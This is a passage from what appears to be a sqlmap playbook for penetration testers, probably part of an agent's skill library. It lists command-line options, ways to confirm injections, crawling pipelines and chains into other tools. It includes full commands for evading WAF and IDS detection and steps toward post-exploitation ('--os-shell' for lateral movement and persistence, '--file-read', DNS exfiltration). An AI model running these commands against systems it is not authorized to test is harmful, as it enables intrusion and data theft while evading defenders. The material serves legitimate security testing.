- `--csv-del <char>` — CSV delimiter (default `,`).
- `--results-file <path>` — CSV results file for multi-target mode (`-m`).

**Configuration persistence:**
- `--save <file>` — save current options to an INI config file. Replay with `-c <file>`.

**Cleanup:**
- `--cleanup` — remove sqlmap-created artifacts (UDFs, temporary tables) from the DBMS.
- `--purge` — safely wipe all sqlmap local data (sessions, logs, output).

## Proof and Validation

**Confirming exploitability:**
- `--proof` — after detecting an injection point, sqlmap proves exploitation by extracting a concrete value. Non-destructive. Use before escalating to enumeration or OS access.
  `sqlmap -u "<url>" -p id --batch --proof`

**False positive rejection:**
- Unstable oracles (dynamic pages, ads, anti-CSRF tokens) cause false positives. Stabilize with:
  - `--string` / `--not-string` — explicit true/false markers.
  - `--code` — HTTP status code oracle.
  - `--text-only` — strip HTML, compare text only.
  - `--titles` — compare page titles only.
- `--flush-session` and retest with different `--technique` combinations to cross-validate.
- `--parse-errors` — display raw DBMS errors (confirms error-based injection is real).
- Manual verification: replay the payload via `hurl` or Caido to confirm the behavior independently of sqlmap's session.

**Re-test discipline:**
- After fixing a vulnerability, retest with `--flush-session` to clear the cached injection state.
- `--eta` — show estimated time of arrival for extraction (useful for validating that blind extraction is progressing).

## Traffic Fingerprint and Detection

sqlmap's default traffic is highly signatured:
- **User-Agent:** `sqlmap/<version> (https://sqlmap.org)` — the most obvious signature. Mitigate with `--random-agent` or `-A <specific-agent>`.
- **Parameter values:** injection payloads contain recognizable patterns (`AND 1=1`, `UNION SELECT NULL`, `SLEEP(5)`, `WAITFOR DELAY`). WAFs and IDS pattern-match these. Mitigate with `--tamper` chains.
- **Request volume:** high-volume parameter testing against a single endpoint triggers rate-based detection. Mitigate with `--delay`, `--safe-url`/`--safe-freq`, `--threads 1`.
- **Session artifacts:** sqlmap creates temporary tables (prefixed `sqlmap` by default — change with `--table-prefix`) and may enable `xp_cmdshell` or upload UDF libraries. `--cleanup` removes these after exploitation.
- **URL patterns:** `--crawl` and `--forms` probe the site structure before testing. Some WAFs flag rapid form submission patterns.

**Reducing the fingerprint:**
`sqlmap -u "<url>" -p id --batch --random-agent --tamper space2comment,randomcase --delay 0.5 --safe-url "https://target.tld/" --safe-freq 5 --proxy http://127.0.0.1:48080 --threads 1`

This is not guaranteed evasion — modern WAFs inspect payload semantics, not just surface patterns. Effectiveness is situational and depends on the WAF vendor, ruleset version, and configuration.

## Parameter Discovery and Crawling

- `--forms` — parse HTML forms from the target URL and test all form parameters.
- `--mine-params` — mine for hidden (unlinked) GET parameters by probing common parameter names. Complements explicit parameter discovery via `arjun`.
- `--crawl <depth>` — crawl the site from the target URL to discover additional injectable endpoints.
- `--crawl-exclude <regex>` — exclude URLs matching the regex from crawling (e.g., `logout|signout`).
- `--scope <regex>` — filter targets by URL regex (useful with `-l` or `-m` inputs).

Pattern: pair with external crawling for broader coverage:
`katana -u https://target.tld -d 3 -jc -f url -o urls.txt && sqlmap -m urls.txt --batch --level 2 --risk 1 --forms`

## Chaining and Routing

**Inbound chains (feeding sqlmap):**
- Caido/Burp → `sqlmap -r request.txt` (save request from proxy, test with sqlmap)
- `katana`/`gospider` → URL list → `sqlmap -m urls.txt` (crawl, then test all discovered endpoints)
- `arjun` → discovered parameters → `sqlmap -u "<url>?<params>" -p <param>` (discover hidden params, then test)
- `gau`/`waybackurls` → historical URLs with parameters → `sqlmap -m params.txt` (test archived endpoints)
- OpenAPI spec → `sqlmap --openapi spec.json` (derive targets from API definition)
- `nuclei` finding → `sqlmap -r request.txt` (escalate a nuclei SQLi detection to full exploitation)

**Outbound chains (sqlmap output driving next steps):**
- Confirmed injection → `--proof` → `--dbs --tables --columns` → scoped `--dump` (progressive enumeration)
- `--os-shell` / `--os-cmd` → post-exploitation (lateral movement, persistence)
- `--file-read` → read application source/config for further vulnerability discovery
- `--dns-domain interactsh` → `interactsh-client` captures DNS exfiltration (validate OOB channel)
- `--report-json` / `--har` → import into Caido for traffic review and manual follow-up
- `--dump-format JSONL` → parse with `jq` for automated analysis

**Routing to vulnerability skills:**
- SQL injection: `sql_injection.md`
- NoSQL injection (`--nosql`): `nosql_injection.md`
- SSTI (`--ssti`): `ssti.md`
- XXE (`--xxe`): `xxe.md`
- XSS (not sqlmap's scope): `xss.md`
- Authentication/JWT (`--jwt`): `authentication_jwt.md`
- Header injection (via `--level 3`+): `header_injection.md`
- Business logic (stacked queries / data modification): `business_logic.md`

**Routing to tool playbooks:**
- Proxy capture: `caido.md`
- Parameter discovery: `arjun.md`
- Crawling: `katana.md`, `gospider.md`
- OOB/OAST: `interactsh-client.md`
- Template scanning (SQLi detection): `nuclei.md`
- URL archives: `gau.md`, `waybackurls.md`
